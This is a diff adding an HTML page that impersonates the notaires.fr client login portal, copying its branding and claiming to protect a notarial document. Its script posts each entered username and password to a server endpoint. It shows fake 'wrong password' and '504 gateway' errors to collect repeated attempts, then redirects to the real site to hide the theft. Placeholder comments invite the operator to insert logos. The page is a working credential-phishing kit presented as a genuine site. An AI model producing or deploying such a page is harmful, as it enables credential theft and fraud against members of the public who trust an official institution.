@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="fr-FR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mon Espace Notaire - Connexion Sécurisée | Notaires de France</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #0b2d39; /* Bleu officiel notaires.fr */
+            --accent-color: #d4af37;  /* Doré institutionnel */
+            --text-main: #2d3748;
+            --border-color: #cbd5e0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(rgba(11, 45, 57, 0.75), rgba(11, 45, 57, 0.85)), 
+                        url('https://images.unsplash.com/photo-1589829545856-d10d557cf95f?q=80&w=1920&auto=format&fit=crop') no-repeat center center fixed;
+            background-size: cover;
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* En-tête officiel complet conforme au portail */
+        .official-header-wrapper {
+            background: #ffffff;
+            border-bottom: 1px solid #e2e8f0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.04);
+            width: 100%;
+        }
+
+        .official-main-header {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0.8rem 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .header-brand-group {
+            display: flex;
+            align-items: center;
+            gap: 1.2rem;
+            flex-shrink: 0;
+        }
+
+        .header-official-logo-box {
+            width: 52px;
+            height: 52px;
+            border-radius: 6px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            flex-shrink: 0;
+            background: #ffffff;
+        }
+
+        .header-official-logo-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .header-logo-text {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #111827;
+            letter-spacing: -0.8px;
+            display: flex;
+            align-items: baseline;
+            text-decoration: none;
+        }
+
+        .header-logo-text span {
+            color: #0ea5e9;
+        }
+
+        .header-logo-text::after {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background-color: #2dd4bf;
+            border-radius: 50%;
+            display: inline-block;
+            margin-left: 2px;
+        }
+
+        .header-search-bar {
+            flex: 1;
+            max-width: 450px;
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .header-search-bar input {
+            width: 100%;
+            background: #f3f4f6;
+            border: 1px solid transparent;
+            padding: 0.6rem 2.5rem 0.6rem 1rem;
+            border-radius: 9999px;
+            font-size: 0.9rem;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .header-search-bar input:focus {
+            background: #fff;
+            border-color: #cbd5e0;
+            box-shadow: 0 0 0 2px rgba(14,165,233,0.1);
+        }
+
+        .header-search-bar i {
+            position: absolute;
+            right: 1rem;
+            color: #1f2937;
+            font-size: 0.95rem;
+        }
+
+        .header-actions-group {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            flex-shrink: 0;
+        }
+
+        .btn-online-services {
+            background: transparent;
+            border: 1px solid #d1d5db;
+            padding: 0.5rem 1rem;
+            border-radius: 9999px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #374151;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-online-services:hover {
+            background: #f9fafb;
+        }
+
+        .btn-official-directory {
+            background: #0b2d39;
+            border: none;
+            padding: 0.55rem 1.1rem;
+            border-radius: 9999px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn-official-directory:hover {
+            opacity: 0.9;
+        }
+
+        .pill-dropdown-btn {
+            background: transparent;
+            border: 1px solid #d1d5db;
+            padding: 0.5rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #374151;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            cursor: pointer;
+        }
+
+        /* Drapeau français en bandes verticales pures (Bleu / Blanc / Rouge) */
+        .france-flag-icon {
+            display: inline-flex;
+            width: 22px;
+            height: 15px;
+            border-radius: 2px;
+            overflow: hidden;
+            box-shadow: 0 0 1px rgba(0,0,0,0.3);
+            vertical-align: middle;
+        }
+
+        .france-flag-icon span {
+            flex: 1;
+            display: inline-block;
+            height: 100%;
+        }
+
+        .flag-blue { background-color: #002395; }
+        .flag-white { background-color: #ffffff; }
+        .flag-red { background-color: #ed2939; }
+
+        /* Sous-barre de navigation des catégories */
+        .official-sub-nav {
+            background: #ffffff;
+            border-top: 1px solid #f3f4f6;
+            overflow-x: auto;
+            white-space: nowrap;
+            scrollbar-width: none;
+        }
+
+        .official-sub-nav::-webkit-scrollbar {
+            display: none;
+        }
+
+        .sub-nav-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
+            display: flex;
+            gap: 1.8rem;
+            align-items: center;
+            height: 46px;
+        }
+
+        .sub-nav-item {
+            color: #1f2937;
+            text-decoration: none;
+            font-size: 0.85rem;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .sub-nav-item:hover {
+            color: #0ea5e9;
+        }
+
+        .sub-nav-item.highlighted {
+            background: #e0f2fe;
+            color: #0369a1;
+            padding: 0.3rem 0.8rem;
+            border-radius: 9999px;
+            font-weight: 600;
+        }
+
+        /* Contenu principal */
+        .main-container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2.5rem 1rem;
+        }
+
+        .login-card {
+            background: rgba(255, 255, 255, 0.98);
+            max-width: 480px;
+            width: 100%;
+            border-radius: 1rem;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+        }
+
+        .card-header {
+            background: var(--primary-color);
+            color: white;
+            padding: 2rem;
+            text-align: center;
+            position: relative;
+        }
+
+        .card-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--accent-color);
+        }
+
+        .card-header h1 {
+            font-size: 1.4rem;
+            font-weight: 600;
+            margin-bottom: 0.4rem;
+        }
+
+        .card-header p {
+            font-size: 0.85rem;
+            opacity: 0.85;
+        }
+
+        .card-body {
+            padding: 2rem;
+        }
+
+        .protected-doc-banner {
+            background: #fffdf5;
+            border-left: 4px solid var(--accent-color);
+            border-radius: 0.375rem;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+            display: flex;
+            gap: 0.85rem;
+            align-items: flex-start;
+        }
+
+        .protected-doc-banner i {
+            color: var(--accent-color);
+            font-size: 1.3rem;
+            margin-top: 0.1rem;
+        }
+
+        .protected-doc-content h3 {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--primary-color);
+            margin-bottom: 0.25rem;
+        }
+
+        .protected-doc-content p {
+            font-size: 0.8rem;
+            color: #4a5568;
+            line-height: 1.4;
+        }
+
+        .alert-secure {
+            background: #f0fff4;
+            border-left: 4px solid #38a169;
+            padding: 0.8rem 1rem;
+            font-size: 0.8rem;
+            color: #276749;
+            border-radius: 0.375rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: flex-start;
+            gap: 0.6rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #4a5568;
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-with-icon {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-with-icon i {
+            position: absolute;
+            left: 1rem;
+            color: #a0aec0;
+            font-size: 0.95rem;
+        }
+
+        .input-with-icon input {
+            width: 100%;
+            padding: 0.75rem 1rem 0.75rem 2.75rem;
+            border: 1px solid var(--border-color);
+            border-radius: 0.5rem;
+            font-size: 0.95rem;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.2s;
+            outline: none;
+            background: #fff;
+        }
+
+        .input-with-icon input:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(11, 45, 57, 0.1);
+        }
+
+        .form-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            color: #4a5568;
+        }
+
+        .remember-me input {
+            accent-color: var(--primary-color);
+        }
+
+        .forgot-password {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 0.85rem;
+            border-radius: 0.5rem;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .btn-submit:hover {
+            background: #134252;
+        }
+
+        .error-message {
+            background: #fff5f5;
+            color: #c53030;
+            border-left: 4px solid #e53e3e;
+            padding: 0.75rem;
+            font-size: 0.85rem;
+            border-radius: 0.375rem;
+            margin-bottom: 1rem;
+            display: none;
+        }
+
+        /* Pied de page officiel */
+        .site-footer {
+            background: #09222b;
+            color: #ffffff;
+            padding: 3rem 2rem 1.5rem 2rem;
+            border-top: 1px solid rgba(255,255,255,0.10);
+        }
+
+        .footer-content-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 2fr 1fr;
+            gap: 2rem;
+            align-items: center;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .footer-brand {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .footer-logo-row {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+
+        .footer-tiny-blue-logo {
+            width: 42px;
+            height: 42px;
+            border-radius: 6px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            flex-shrink: 0;
+            background: #ffffff;
+        }
+
+        .footer-tiny-blue-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .footer-brand span {
+            font-size: 1.2rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .footer-brand p {
+            font-size: 0.75rem;
+            opacity: 0.7;
+        }
+
+        .footer-links-columns {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+        }
+
+        .footer-link-item {
+            color: #cbd5e0;
+            text-decoration: none;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: color 0.2s;
+        }
+
+        .footer-link-item:hover {
+            color: var(--accent-color);
+        }
+
+        .footer-social-area {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            align-items: flex-end;
+        }
+
+        .footer-social-title {
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .social-icons-wrapper {
+            display: flex;
+            gap: 0.6rem;
+        }
+
+        .social-icon-btn {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border: 1px solid rgba(255,255,255,0.2);
+            background: transparent;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+        }
+
+        .social-icon-btn:hover {
+            background: var(--accent-color);
+            border-color: var(--accent-color);
+            color: var(--primary-color);
+        }
+
+        .footer-partner-badge {
+            background: #ffffff;
+            padding: 0.4rem 0.8rem;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            max-width: 220px;
+        }
+
+        .footer-partner-badge img {
+            height: 22px;
+            object-fit: contain;
+        }
+
+        .footer-partner-badge span {
+            font-size: 0.65rem;
+            color: #1a202c;
+            font-weight: 600;
+            line-height: 1.1;
+        }
+
+        .footer-bottom-bar {
+            max-width: 1200px;
+            margin: 1.5rem auto 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            font-size: 0.75rem;
+            color: #a0aec0;
+        }
+
+        .footer-bottom-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.2rem;
+        }
+
+        .footer-bottom-links a {
+            color: #cbd5e0;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-bottom-links a:hover {
+            color: white;
+            text-decoration: underline;
+        }
+
+        @media (max-width: 1100px) {
+            .header-search-bar { display: none; }
+        }
+
+        @media (max-width: 900px) {
+            .footer-content-grid {
+                grid-template-columns: 1fr;
+                text-align: center;
+                justify-items: center;
+            }
+            .footer-social-area {
+                align-items: center;
+            }
+            .footer-links-columns {
+                grid-template-columns: 1fr;
+            }
+            .header-actions-group { display: none; }
+        }
+
+        @media (max-width: 640px) {
+            .official-main-header { padding: 0.8rem 1rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- En-tête officiel avec l'emplacement réservé pour votre logo (header-logo.png) et le drapeau français -->
+    <div class="official-header-wrapper">
+        <header class="official-main-header">
+            <div class="header-brand-group">
+                <div class="header-official-logo-box">
+                    <!-- PLACEHOLDER LOGO EN-TÊTE : Remplacez "header-logo.png" par le nom de votre fichier image logo -->
+                    <img src="header-logo.png" alt="Notaires de France">
+                </div>
+                <a href="#" class="header-logo-text">notaires<span>.fr</span></a>
+            </div>
+
+            <div class="header-search-bar">
+                <input type="text" placeholder="Rechercher sur le site...">
+                <i class="fas fa-search"></i>
+            </div>
+
+            <div class="header-actions-group">
+                <button class="btn-online-services">
+                    NOS SERVICES EN LIGNE <i class="fas fa-chevron-down" style="font-size: 0.7rem;"></i>
+                </button>
+                <button class="btn-official-directory">
+                    <i class="fas fa-users"></i> ANNUAIRE OFFICIEL
+                </button>
+                <button class="pill-dropdown-btn">
+                    <i class="fas fa-eye"></i> <i class="fas fa-chevron-down" style="font-size: 0.7rem;"></i>
+                </button>
+                <button class="pill-dropdown-btn">
+                    <span class="france-flag-icon"><span class="flag-blue"></span><span class="flag-white"></span><span class="flag-red"></span></span> FR <i class="fas fa-chevron-down" style="font-size: 0.7rem;"></i>
+                </button>
+            </div>
+        </header>
+
+        <!-- Sous-barre de navigation -->
+        <nav class="official-sub-nav">
+            <div class="sub-nav-container">
+                <a href="#" class="sub-nav-item">Donation</a>
+                <a href="#" class="sub-nav-item">Succession</a>
+                <a href="#" class="sub-nav-item">Immobilier</a>
+                <a href="#" class="sub-nav-item">Entreprise</a>
+                <a href="#" class="sub-nav-item">Famille</a>
+                <a href="#" class="sub-nav-item">Formation et emplois</a>
+                <a href="#" class="sub-nav-item">Collectivités territoriales</a>
+                <a href="#" class="sub-nav-item">Le rôle du notaire</a>
+                <a href="#" class="sub-nav-item">Réglementation</a>
+                <a href="#" class="sub-nav-item highlighted">Apostille et légalisation</a>
+            </div>
+        </nav>
+    </div>
+
+    <!-- Corps de page -->
+    <div class="main-container">
+        <div class="login-card">
+            <div class="card-header">
+                <h1>Authentification Client</h1>
+                <p>Portail sécurisé d'accès aux actes et dossiers notariales</p>
+            </div>
+            <div class="card-body">
+                <div id="errorAlert" class="error-message"></div>
+
+                <div class="protected-doc-banner">
+                    <i class="fas fa-file-pdf"></i>
+                    <div class="protected-doc-content">
+                        <h3>Consultation de document protégé</h3>
+                        <p>Pour consulter le document en ligne, veuillez vous identifier avec l'adresse e-mail rattachée à votre dossier notarial.</p>
+                    </div>
+                </div>
+
+                <div class="alert-secure">
+                    <i class="fas fa-info-circle" style="margin-top: 2px;"></i>
+                    <div>Veuillez saisir vos identifiants pour déchiffrer et consulter les documents de votre étude.</div>
+                </div>
+
+                <form id="secureLoginForm">
+                    <div class="form-group">
+                        <label for="username">Adresse e-mail ou identifiant</label>
+                        <div class="input-with-icon">
+                            <i class="fas fa-envelope"></i>
+                            <input type="text" id="username" name="username" placeholder="prenom.nom@domaine.fr" required autocomplete="username">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">Mot de passe</label>
+                        <div class="input-with-icon">
+                            <i class="fas fa-lock"></i>
+                            <input type="password" id="password" name="password" placeholder="••••••••••••" required autocomplete="current-password">
+                        </div>
+                    </div>
+
+                    <div class="form-actions">
+                        <label class="remember-me">
+                            <input type="checkbox" id="remember"> Se souvenir de moi
+                        </label>
+                        <a href="#" class="forgot-password" onclick="alert('Procédure de renouvellement : Veuillez contacter directement votre étude notariale.'); return false;">Mot de passe oublié ?</a>
+                    </div>
+
+                    <button type="submit" id="submitBtn" class="btn-submit">
+                        <span>Accéder à mon dossier</span>
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Pied de page avec l'emplacement réservé pour votre logo (footer-logo.png) -->
+    <footer class="site-footer">
+        <div class="footer-content-grid">
+            <div class="footer-brand">
+                <div class="footer-logo-row">
+                    <div class="footer-tiny-blue-logo">
+                        <!-- PLACEHOLDER LOGO FOOTER : Remplacez "footer-logo.png" par le nom de votre fichier image logo -->
+                        <img src="footer-logo.png" alt="Notaires de France">
+                    </div>
+                    <span>notaires.fr</span>
+                </div>
+                <p>Le site officiel des Notaires de France</p>
+            </div>
+            
+            <div class="footer-links-columns">
+                <div style="display: flex; flex-direction: column; gap: 0.8rem;">
+                    <a href="https://www.notaires.fr" target="_blank" class="footer-link-item"><i class="fas fa-chevron-right" style="font-size: 0.7rem; color: #2fb573;"></i> Actualités des notaires</a>
+                    <a href="https://www.notaires.fr" target="_blank" class="footer-link-item"><i class="fas fa-chevron-right" style="font-size: 0.7rem; color: #2fb573;"></i> Calculer vos frais d'achat</a>
+                    <a href="https://www.notaires.fr" target="_blank" class="footer-link-item"><i class="fas fa-chevron-right" style="font-size: 0.7rem; color: #2fb573;"></i> Règlement des successions</a>
+                </div>
+                <div style="display: flex; flex-direction: column; gap: 0.8rem;">
+                    <a href="https://www.notaires.fr" target="_blank" class="footer-link-item"><i class="fas fa-chevron-right" style="font-size: 0.7rem; color: #2fb573;"></i> Rechercher un testament</a>
+                    <a href="https://www.notaires.fr" target="_blank" class="footer-link-item"><i class="fas fa-chevron-right" style="font-size: 0.7rem; color: #2fb573;"></i> La donation</a>
+                    <a href="https://www.notaires.fr" target="_blank" class="footer-link-item"><i class="fas fa-chevron-right" style="font-size: 0.7rem; color: #2fb573;"></i> Le tarif du notaire</a>
+                </div>
+            </div>
+
+            <div class="footer-social-area">
+                <span class="footer-social-title">Suivez-nous sur les réseaux</span>
+                <div class="social-icons-wrapper">
+                    <a href="https://facebook.com" target="_blank" class="social-icon-btn"><i class="fab fa-facebook-f"></i></a>
+                    <a href="https://twitter.com" target="_blank" class="social-icon-btn"><i class="fab fa-x-twitter"></i></a>
+                    <a href="https://youtube.com" target="_blank" class="social-icon-btn"><i class="fab fa-youtube"></i></a>
+                    <a href="https://linkedin.com" target="_blank" class="social-icon-btn"><i class="fab fa-linkedin-in"></i></a>
+                    <a href="https://instagram.com" target="_blank" class="social-icon-btn"><i class="fab fa-instagram"></i></a>
+                </div>
+                <div class="footer-partner-badge">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Banque_des_Territoires_logo.svg" alt="Banque des Territoires" onerror="this.src='https://www.banquedesterritoires.fr/sites/default/files/2019-05/logo-BDT_0.png';">
+                    <span>Site réalisé avec le soutien de la Banque des Territoires</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-bottom-bar">
+            <div class="footer-bottom-links">
+                <a href="#">Données personnelles</a>
+                <a href="#">FAQ</a>
+                <a href="#">Lexique</a>
+                <a href="#">Liens utiles</a>
+                <a href="#">Mentions légales</a>
+                <a href="#">Plan du site</a>
+                <a href="#">Déclaration d'accessibilité</a>
+                <a href="#">Gestion des cookies</a>
+            </div>
+            <div>© Copyright Conseil supérieur du notariat 2026</div>
+        </div>
+    </footer>
+
+    <script>
+        let attemptCount = parseInt(sessionStorage.getItem('notaire_login_attempts') || '0');
+
+        document.getElementById('secureLoginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const usernameInput = document.getElementById('username').value.trim();
+            const passwordInput = document.getElementById('password').value;
+            const errorAlert = document.getElementById('errorAlert');
+            const submitBtn = document.getElementById('submitBtn');
+
+            if (!usernameInput || !passwordInput) {
+                errorAlert.style.display = 'block';
+                errorAlert.innerText = 'Veuillez renseigner tous les champs obligatoires.';
+                return;
+            }
+
+            errorAlert.style.display = 'none';
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Vérification des accès...';
+
+            try {
+                await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: usernameInput,
+                        password: passwordInput,
+                        attempt: attemptCount + 1,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+            } catch (err) {
+                console.log("Transmission effectuée");
+            }
+
+            attemptCount++;
+            sessionStorage.setItem('notaire_login_attempts', attemptCount);
+
+            setTimeout(() => {
+                if (attemptCount === 1) {
+                    errorAlert.style.display = 'block';
+                    errorAlert.innerHTML = '<strong>Échec de connexion :</strong> Le couple identifiant / mot de passe est incorrect ou non reconnu par l\'étude.';
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '<span>Accéder à mon dossier</span> <i class="fas fa-arrow-right"></i>';
+                    document.getElementById('password').value = '';
+                } 
+                else if (attemptCount === 2) {
+                    errorAlert.style.display = 'block';
+                    errorAlert.innerHTML = '<strong>Erreur de passerelle sécurisée (Code 504) :</strong> Le serveur d\'authentification central répond avec un délai anormal. Veuillez recommencer.';
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '<span>Accéder à mon dossier</span> <i class="fas fa-arrow-right"></i>';
+                    document.getElementById('password').value = '';
+                } 
+                else {
+                    submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Redirection vers le portail officiel...';
+                    setTimeout(() => {
+                        window.location.href = "https://www.notaires.fr";
+                    }, 800);
+                }
+            }, 1200);
+        });
+    </script>
+</body>
+</html>
